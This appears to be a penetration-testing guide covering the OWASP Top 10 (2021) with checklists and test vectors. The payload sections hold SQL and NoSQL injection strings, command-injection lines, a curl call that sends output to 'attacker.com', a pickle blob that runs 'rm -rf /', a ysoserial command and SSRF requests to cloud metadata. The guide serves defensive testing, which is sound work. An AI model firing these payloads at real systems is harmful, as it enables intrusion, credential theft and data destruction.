# OWASP Top 10 Testing Guide

Comprehensive test cases for the OWASP Top 10 (2021) vulnerabilities.

## OWASP Top 10 (2021)

```
┌─────────────────────────────────────────────────────────────────────┐
│                    OWASP TOP 10 (2021)                               │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  A01: BROKEN ACCESS CONTROL                                         │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Users can access unauthorized functions or data         │  │
│  │ Examples:                                                     │  │
│  │   • Accessing other users' data via modified URLs             │  │
│  │   • Privilege escalation (user → admin)                       │  │
│  │   • Bypassing access controls via API manipulation            │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Modify user ID in URL to access other users' data         │  │
│  │   □ Access admin endpoints as regular user                    │  │
│  │   □ Test IDOR (Insecure Direct Object Reference)              │  │
│  │   □ Test horizontal and vertical privilege escalation         │  │
│  │   □ Verify JWT/session tokens can't be manipulated            │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A02: CRYPTOGRAPHIC FAILURES                                        │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Sensitive data exposed due to weak/missing encryption   │  │
│  │ Examples:                                                     │  │
│  │   • Passwords stored in plaintext                             │  │
│  │   • Sensitive data transmitted over HTTP                      │  │
│  │   • Weak encryption algorithms (MD5, SHA1)                    │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Verify TLS on all sensitive endpoints                     │  │
│  │   □ Check password hashing (bcrypt, Argon2)                   │  │
│  │   □ Test for sensitive data in logs                           │  │
│  │   □ Verify encryption at rest for PII                         │  │
│  │   □ Check for weak cipher suites                              │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A03: INJECTION                                                     │  │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Untrusted data sent to interpreter as command/query     │  │
│  │ Examples:                                                     │  │
│  │   • SQL injection                                             │  │
│  │   • Command injection                                         │  │
│  │   • LDAP injection                                            │  │
│  │   • XPath injection                                           │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Test SQL injection: ' OR '1'='1' --                       │  │
│  │   □ Test command injection: ; ls -la                          │  │
│  │   □ Test NoSQL injection: {"$gt": ""}                         │  │
│  │   □ Verify parameterized queries used                         │  │
│  │   □ Test all user input points                                │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A04: INSECURE DESIGN                                               │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Missing or ineffective security controls by design      │  │
│  │ Examples:                                                     │  │
│  │   • No rate limiting on authentication                        │  │
│  │   • Missing anti-automation controls                          │  │
│  │   • Insufficient input validation architecture                │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Review threat models and security requirements            │  │
│  │   □ Test rate limiting on sensitive endpoints                 │  │
│  │   □ Verify security controls at all trust boundaries          │  │
│  │   □ Test business logic for security flaws                    │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A05: SECURITY MISCONFIGURATION                                     │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Insecure default settings or incomplete configurations  │  │
│  │ Examples:                                                     │  │
│  │   • Default credentials left unchanged                        │  │
│  │   • Unnecessary features enabled                              │  │
│  │   • Detailed error messages exposed                           │  │
│  │   • Missing security headers                                  │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Scan for default credentials                              │  │
│  │   □ Check security headers (CSP, HSTS, X-Frame-Options)       │  │
│  │   □ Verify error handling doesn't leak info                   │  │
│  │   □ Test for directory listing enabled                        │  │
│  │   □ Check for unnecessary HTTP methods                        │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A06: VULNERABLE AND OUTDATED COMPONENTS                            │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Using components with known vulnerabilities             │  │
│  │ Examples:                                                     │  │
│  │   • Outdated libraries with CVEs                              │  │
│  │   • Unpatched operating systems                               │  │
│  │   • End-of-life software                                      │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Run SCA tools (Snyk, Dependabot)                          │  │
│  │   □ Check for CVEs in all dependencies                        │  │
│  │   □ Verify patch management process                           │  │
│  │   □ Test for known exploits in components                     │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A07: IDENTIFICATION AND AUTHENTICATION FAILURES                    │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Weak authentication or session management               │  │
│  │ Examples:                                                     │  │
│  │   • Weak passwords allowed                                    │  │
│  │   • Credential stuffing possible                              │  │
│  │   • Session fixation                                          │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Test password policy enforcement                          │  │
│  │   □ Verify brute force protection                             │  │
│  │   □ Test session timeout and invalidation                     │  │
│  │   □ Check MFA implementation                                  │  │
│  │   □ Test credential recovery flow                             │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A08: SOFTWARE AND DATA INTEGRITY FAILURES                          │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Code/data integrity not verified                        │  │
│  │ Examples:                                                     │  │
│  │   • Insecure deserialization                                  │  │
│  │   • CI/CD pipeline compromise                                 │  │
│  │   • Unsigned software updates                                 │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Test for insecure deserialization                         │  │
│  │   □ Verify code signing on deployments                        │  │
│  │   □ Check CI/CD pipeline security                             │  │
│  │   □ Test for tampering in data pipelines                      │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A09: SECURITY LOGGING AND MONITORING FAILURES                      │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Insufficient logging, monitoring, or alerting           │  │
│  │ Examples:                                                     │  │
│  │   • Failed logins not logged                                  │  │
│  │   • No alerting on suspicious activity                        │  │
│  │   • Logs stored insecurely                                    │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Verify security events are logged                         │  │
│  │   □ Test log integrity (tampering protection)                 │  │
│  │   □ Check alerting for security events                        │  │
│  │   □ Verify logs don't contain sensitive data                  │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
│  A10: SERVER-SIDE REQUEST FORGERY (SSRF)                            │
│  ┌───────────────────────────────────────────────────────────────┐  │
│  │ What: Server fetches attacker-controlled URLs                 │  │
│  │ Examples:                                                     │  │
│  │   • Accessing internal services via URL parameter             │  │
│  │   • Cloud metadata endpoint access                            │  │
│  │   • Port scanning internal network                            │  │
│  │                                                               │  │
│  │ Test Cases:                                                   │  │
│  │   □ Test URL parameters with internal IPs                     │  │
│  │   □ Try accessing cloud metadata (169.254.169.254)            │  │
│  │   □ Test webhook/callback URLs                                │  │
│  │   □ Verify URL allowlisting                                   │  │
│  └───────────────────────────────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## A01: Broken Access Control - Detailed Testing

### Horizontal Privilege Escalation
Test if users can access other users' data at the same privilege level.

**Test Vectors:**
```
# Original request
GET /api/users/123/orders

# Attack attempts
GET /api/users/124/orders
GET /api/users/456/orders
POST /api/users/789/profile/update
```

### Vertical Privilege Escalation
Test if regular users can access admin functions.

**Test Vectors:**
```
# Admin endpoints as regular user
GET /api/admin/users
POST /api/admin/settings
DELETE /api/admin/users/123

# Role manipulation
POST /api/profile/update {"role": "admin"}
PUT /api/users/me {"is_admin": true}
```

### IDOR (Insecure Direct Object References)
Test direct access to resources via predictable identifiers.

**Test Vectors:**
```
# Sequential IDs
GET /api/documents/1
GET /api/documents/2
GET /api/documents/1000

# UUID guessing (less common but possible)
GET /api/files/550e8400-e29b-41d4-a716-446655440000

# Hidden parameters
GET /api/profile?user_id=123
GET /api/profile?user_id=456
```

## A02: Cryptographic Failures - Detailed Testing

### TLS/SSL Testing
```bash
# Test TLS version
openssl s_client -connect example.com:443 -tls1

# Test cipher suites
nmap --script ssl-enum-ciphers -p 443 example.com

# Test certificate validity
openssl s_client -connect example.com:443 -showcerts
```

### Password Storage Testing
- Verify password hashing algorithm (bcrypt, Argon2, scrypt)
- Check for salting
- Verify no reversible encryption
- Test password history enforcement

### Data Encryption at Rest
- Verify database encryption
- Check file storage encryption
- Test key management practices
- Verify encryption of backups

## A03: Injection - Detailed Testing

### SQL Injection Payloads
```sql
-- Authentication bypass
' OR '1'='1' --
' OR '1'='1' /*
admin' --

-- Data extraction
' UNION SELECT username, password FROM users --
' UNION SELECT NULL, version() --

-- Time-based blind SQLi
' AND SLEEP(5) --
'; WAITFOR DELAY '00:00:05' --

-- Boolean-based blind SQLi
' AND 1=1 --
' AND 1=2 --
```

### NoSQL Injection Payloads
```javascript
// MongoDB injection
{"$gt": ""}
{"$ne": null}
{"$regex": ".*"}

// Login bypass
{username: {$ne: null}, password: {$ne: null}}
{username: "admin", password: {$regex: "^.*"}}
```

### Command Injection Payloads
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
&& curl attacker.com/$(whoami)
```

## A04: Insecure Design - Detailed Testing

### Rate Limiting Tests
- Test authentication endpoint rate limits
- Verify API rate limiting per user/IP
- Test for distributed rate limiting bypass
- Check for rate limit headers

### Business Logic Tests
- Test workflow bypass (skip payment, skip approval)
- Test negative quantities/amounts
- Test race conditions
- Test for insufficient entropy in tokens

## A05: Security Misconfiguration - Detailed Testing

### Security Headers Checklist
```
□ Content-Security-Policy
□ Strict-Transport-Security (HSTS)
□ X-Frame-Options
□ X-Content-Type-Options
□ X-XSS-Protection (legacy)
□ Referrer-Policy
□ Permissions-Policy
```

### Default Credentials Testing
Common defaults to test:
- admin/admin
- admin/password
- root/root
- default/default
- Check vendor documentation for defaults

### Directory Listing Tests
```
GET /images/
GET /uploads/
GET /backup/
GET /logs/
```

## A06: Vulnerable Components - Detailed Testing

### Dependency Scanning Commands
```bash
# Node.js
npm audit
npm audit fix

# Python
pip-audit
safety check

# Ruby
bundle audit

# Java
mvn dependency-check:check
```

### Version Detection
- Check HTTP headers for version disclosure
- Test for known CVEs in detected versions
- Verify all components are actively maintained
- Check for end-of-life software

## A07: Authentication Failures - Detailed Testing

See `authentication-testing.md` for comprehensive authentication test cases.

## A08: Integrity Failures - Detailed Testing

### Insecure Deserialization Tests
```python
# Python pickle injection
import pickle
malicious = b"cos\nsystem\n(S'rm -rf /'\ntR."

# Java deserialization
# Test with ysoserial payloads
java -jar ysoserial.jar CommonsCollections1 calc
```

### CI/CD Security Tests
- Verify pipeline secrets are not logged
- Test for unsigned artifacts
- Check for mutable build dependencies
- Verify integrity checks on deployments

## A09: Logging Failures - Detailed Testing

### Required Security Events
- Failed login attempts
- Successful logins
- Password changes
- Privilege escalations
- Access to sensitive data
- Authentication token usage
- API rate limit violations

### Log Security Tests
- Verify logs don't contain passwords
- Test log injection (newline injection)
- Verify log integrity (tamper detection)
- Check log retention policies
- Test alerting on security events

## A10: SSRF - Detailed Testing

### SSRF Payloads
```
# Internal IP access
http://127.0.0.1
http://localhost
http://0.0.0.0
http://192.168.1.1

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

# Port scanning
http://internal-host:22
http://internal-host:3306
http://internal-host:6379

# Bypass attempts
http://127.1
http://2130706433 (decimal form of 127.0.0.1)
http://[::1]
```

### SSRF Prevention Verification
- Test URL allowlist enforcement
- Verify DNS rebinding protection
- Check for HTTP redirect following
- Test for URL parser inconsistencies
